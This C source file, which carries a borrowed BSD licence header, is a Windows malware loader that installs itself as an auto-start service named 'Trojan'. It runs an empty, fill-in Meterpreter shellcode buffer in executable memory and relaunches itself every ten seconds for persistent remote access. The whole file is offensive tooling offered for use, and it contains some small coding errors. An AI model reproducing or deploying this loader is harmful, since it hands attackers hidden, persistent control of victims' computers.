/* Copyright (c) 2007, Determina Inc.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. Neither the name of Determina Inc. nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

#define SERVICE_NAME  'Trojan'
#define DISPLAY_NAME  'Meterpreter'
#define SLEEP_TIME    10000

//
// Globals
//

SERVICE_STATUS status;
SERVICE_STATUS_HANDLE hStatus;

//
// Meterpreter connect back to host
//

void start_meterpreter() 
{
// Your meterpreter shell here
unsigned char buf[] = 
"";

    LPVOID buffer = (LPVOID)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(buffer,buf,sizeof(buf));
    HANDLE hThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)(buffer),NULL,0,NULL);
    WaitForSingleObject(hThread,INFINITE);
    CloseHandle(hThread);
}

//
// Call self without parameter to start meterpreter
//

void self_call()
{
    char path[MAX_PATH];
    char cmd[MAX_PATH];

    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        // Get module file name failed
        return;
    }

    STARTUPINFO startup_info;
    PROCESS_INFORMATION process_information;

    ZeroMemory(&startup_info, sizeof(startup_info));
    startup_info.cb = sizeof(startup_info);

    ZeroMemory(&process_information, sizeof(process_information));

    // If create process failed.
    if (CreateProcess(path, path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL,
                      NULL, &startup_info, &process_information) == 0)
    {
        return;
    }

    // Wait until the process died.
    WaitForSingleObject(process_information.hProcess, INFINITE);
}

//
// Process control requests from the Service Control Manager
//

VOID WINAPI ServiceCtrlHandler(DWORD fdwControl)
{
    switch (fdwControl) {
        case SERVICE_CONTROL_STOP:
        case SERVICE_CONTROL_SHUTDOWN:
            status.dwWin32ExitCode = 0;
            status.dwCurrentState = SERVICE_STOPPED;
            break;

        case SERVICE_CONTROL_PAUSE:
            status.dwWin32ExitCode = 0;
            status.dwCurrentState = SERVICE_PAUSED;
            break;

        case SERVICE_CONTROL_CONTINUE:
            status.dwWin32ExitCode = 0;
            status.dwCurrentState = SERVICE_RUNNING;
            break;

        default:
            break;
    }

    if (SetServiceStatus(hStatus, &status) == 0) {
        printf("Cannot set service status (0x%08x)\n", GetLastError());
        exit(1);
    }

    return;
}


//
// Main function of service
//

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
{
    // Register the service handler
    
    hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (hStatus == 0) {
        printf("Cannot register service handler (0x%08x)\n", GetLastError());
        exit(1);
    }

    // Initialize the service status structure

    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS;
    status.dwCurrentState = SERVICE_RUNNING;
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    status.dwWin32ExitCode = NO_ERROR;
    status.dwServiceSpecificExitCode = 0;
    status.dwCheckPoint = 0;
    status.dwWaitHint = 0;

    if (SetServiceStatus(hStatus, &status) == 0) {
        printf("Cannot set service status (0x%08x)\n", GetLastError());
        return;
    }

    // Start the Meterpreter
    while (status.dwCurrentState == SERVICE_RUNNING) {
        self_call(); 
        Sleep(SLEEP_TIME);
    }

    return;
}


//
// Installs and starts the Meterpreter service
//

BOOL install_service()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;

    char path[MAX_PATH];

    // Get the current module name

    if (!GetModuleFileName(NULL, path, MAX_PATH)) {
        printf("Cannot get module name (0x%08x)\n", GetLastError());
        return FALSE;
    }

    // Build the service command line

    char cmd[MAX_PATH];
    int len = _snprintf(cmd, sizeof(cmd), "\"%s\" service", path);

    if (len < 0 || len == sizeof(cmd)) {
        printf("Cannot build service command line (0x%08x)\n", -1);
        return FALSE;
    }

    // Open the service manager

    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);

    if (hSCManager == NULL) {
        printf("Cannot open service manager (0x%08x)\n", GetLastError());
        return FALSE;
    }

    // Create the service

    hService = CreateService(
        hSCManager,
        SERVICE_NAME,
        DISPLAY_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        cmd,
        NULL,
        NULL,
        NULL,
        NULL,   /* LocalSystem account */
        NULL
    );

    if (hService == NULL) {
        printf("Cannot create service (0x%08x)\n", GetLastError());

        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Start the service
    
    char* args[] = { path, "service" };

    if (StartService(hService, 2, (const char**)&args) == 0) {
        DWORD err = GetLastError();

        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            printf("Cannot start service %s (0x%08x)\n", SERVICE_NAME, err);

            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }

    // Cleanup

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    //printf("Service %s successfully installed.\n", SERVICE_NAME);
    fflush(stdout);

    return TRUE;
}


//
// Stops and removes the Meterpreter service
//

BOOL remove_service()
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    SERVICE_STATUS status;
    DWORD err;

    // Open the service manager

    hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);

    if (hSCManager == NULL) {
        printf("Cannot open service manager (0x%08x)\n", GetLastError());
        return FALSE;
    }

    // Open the service

    hService = OpenService(hSCManager, SERVICE_NAME, SERVICE_STOP | DELETE);

    if (hService == NULL) {
        printf("Cannot open service %s (0x%08x)\n", SERVICE_NAME, GetLastError());

        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Stop the service

    printf(" * Stopping service %s\n", SERVICE_NAME);
    fflush(stdout);
    
    if (ControlService(hService, SERVICE_CONTROL_STOP, &status) == 0) {
        err = GetLastError();

        if (err != ERROR_SERVICE_NOT_ACTIVE) {
            printf("Cannot stop service %s (0x%08x)\n", SERVICE_NAME, err);

            CloseServiceHandle(hSCManager);
            return FALSE;
        }
    }

    // Delete the service

    printf(" * Removing service\n");
    fflush(stdout);
    
    if (DeleteService(hService) == 0) {
        printf("Cannot delete service %s (0x%08x)\n", SERVICE_NAME);
        
        CloseServiceHandle(hSCManager);
        return FALSE;
    }

    // Cleanup

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);

    printf("Service %s successfully removed.\n", SERVICE_NAME);
    fflush(stdout);

    return TRUE;
}


//
// Start the service
//

void start_service()
{
    SERVICE_TABLE_ENTRY ServiceTable[] =
    {
        { SERVICE_NAME, &ServiceMain },
        { NULL, NULL }
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
        printf("Cannot start the service control dispatcher (0x%08x)\n",
            GetLastError());
        exit(1);
    }
}


//
// Main function
//

int main(int argc, char *argv[])
{
    if (argc == 2) {

        if (strcmp(argv[1], "install-service") == 0) {

            // Installs and starts the service

            install_service();
            return 0;
        }
        else if (strcmp(argv[1], "remove-service") == 0) {
        
            // Stops and removes the service
            
            remove_service();
            return 0;
        }
        else if (strcmp(argv[1], "service") == 0) {
        
            // Starts the Meterpreter as a service

            start_service();
            return 0;
        }
    }

    // Starts the Meterpreter as a normal application

    start_meterpreter();

    return 0;
}
